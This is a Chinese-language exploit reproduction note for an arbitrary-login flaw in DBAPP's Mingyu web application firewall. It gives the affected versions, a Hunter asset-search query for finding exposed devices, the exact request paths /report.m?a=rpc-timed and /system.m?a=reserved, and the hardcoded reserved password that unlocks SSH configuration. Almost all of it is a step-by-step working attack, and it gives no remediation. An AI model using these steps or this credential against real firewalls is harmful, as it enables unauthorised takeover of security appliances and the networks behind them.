# 安恒明御Web应用防火墙任意登录漏洞

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF X86 架构 <= 4.6.33</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 信创兆芯 = 4.5</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 鲲鹏 = 4.6.18</font>

# <font style="color:rgb(36, 41, 46);">三、资产测绘</font>
+ hunter：`app.name="安恒明御 WEB应用防火墙"`

![1691870207684-43773e1e-380f-4b50-97c4-970a85fe15da.png](./img/2T7HQw4oHIy0OLXx/1691870207684-43773e1e-380f-4b50-97c4-970a85fe15da-510345.png)

+ 登录页面

![1691870225669-83195d88-a32e-4040-9f1c-2a56c683bc0b.png](./img/2T7HQw4oHIy0OLXx/1691870225669-83195d88-a32e-4040-9f1c-2a56c683bc0b-657075.png)

![1691870232014-cbeb65c6-e392-4ec9-9a10-a412bb88d806.png](./img/2T7HQw4oHIy0OLXx/1691870232014-cbeb65c6-e392-4ec9-9a10-a412bb88d806-158115.png)

# 四、漏洞复现
1. 访问poc

```plain
/report.m?a=rpc-timed
```

![1691870301946-d3891e18-1a97-42d1-b267-b33469f8346c.png](./img/2T7HQw4oHIy0OLXx/1691870301946-d3891e18-1a97-42d1-b267-b33469f8346c-880725.png)

2. <font style="color:rgb(36, 41, 46);">接着删除路径信息，再次访问登录界面就会出现这个界面</font>

![1691870377480-392d2c1d-9a61-49de-9dd7-4238ddede8d1.png](./img/2T7HQw4oHIy0OLXx/1691870377480-392d2c1d-9a61-49de-9dd7-4238ddede8d1-426367.png)![1691870410076-6ce9b3d6-93a4-4520-9df6-de8c21438976.png](./img/2T7HQw4oHIy0OLXx/1691870410076-6ce9b3d6-93a4-4520-9df6-de8c21438976-170796.png)

3. 访问下面这个路径，进入系统设置（不能直接点系统设置），就可以更改SSH的配置了。

```plain
/system.m?a=reserved
```

![1691870717826-fb965fdd-ec4c-411d-a116-5e9935289e2b.png](./img/2T7HQw4oHIy0OLXx/1691870717826-fb965fdd-ec4c-411d-a116-5e9935289e2b-731935.png)

4. 在密码框中，输入密码,就可以更改SSH配置,也可查看其他菜单

```plain
!@#dbapp-waf-dev-reserved#@!
```

![1691870792270-ff4dc9a2-cce2-4788-9c6a-e704841c90fa.png](./img/2T7HQw4oHIy0OLXx/1691870792270-ff4dc9a2-cce2-4788-9c6a-e704841c90fa-715844.png)



> 更新: 2024-02-29 23:57:16  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fg8ocgvc7bpywni4>